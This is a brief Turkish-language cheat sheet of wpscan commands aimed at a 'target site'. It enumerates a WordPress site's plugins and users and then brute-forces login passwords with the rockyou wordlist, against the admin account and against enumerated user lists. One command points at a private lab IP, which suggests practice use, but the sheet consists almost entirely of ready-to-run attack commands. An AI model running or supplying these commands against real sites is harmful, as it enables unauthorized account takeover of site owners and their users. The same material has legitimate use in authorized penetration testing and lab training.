hedef site üzerinde kullanılan pluginleri bulma

```bash
wpscan --url http://<site-adresi> --enumerate p
```
hedef site üzerinde kullanıcı bulma

```bash
wpscan --url http://hedefsite.com -e u
```
```bash
/ bunları siledebiliriz boşluk bırakıyor onlar !!!
```
hedef site üzerindeki userleri bul ve bulduğun userlere direkt bruteforce at !!
```bash
wpscan --url http://10.10.91.62/ -e u -P /usr/share/wordlists/rockyou.txt
```
Brute Force Şifre Denemesi
```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames admin \
--max-threads 10

```
 Ekstra: Kullanıcı Listesi ile Brute Force

```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames users.txt \
--max-threads 10

```

